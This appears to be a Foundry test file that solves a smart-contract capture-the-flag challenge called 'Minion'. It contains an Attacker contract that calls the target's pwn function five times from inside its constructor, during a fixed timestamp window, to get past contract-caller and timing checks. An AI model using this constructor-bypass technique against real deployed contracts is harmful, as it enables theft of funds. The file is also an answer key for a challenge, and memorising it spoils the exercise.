// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Minion.sol";

contract TestMinion is Test {
    Minion public minion;
    Attacker public attacker;

    function setUp() public {
        minion = new Minion();
        vm.deal(msg.sender, 1 ether);
        attacker = new Attacker{value: 1 ether}(minion);
    }

    function testSuccess() public {
        assertTrue(minion.verify(address(attacker)));
    }
}

contract Attacker {
    constructor(Minion _minion) payable {
        require(
            block.timestamp % 120 >= 0 && block.timestamp % 120 < 60,
            "Not the right time"
        );
        _minion.pwn{value: 0.2 ether}();
        _minion.pwn{value: 0.2 ether}();
        _minion.pwn{value: 0.2 ether}();
        _minion.pwn{value: 0.2 ether}();
        _minion.pwn{value: 0.2 ether}();
    }
}
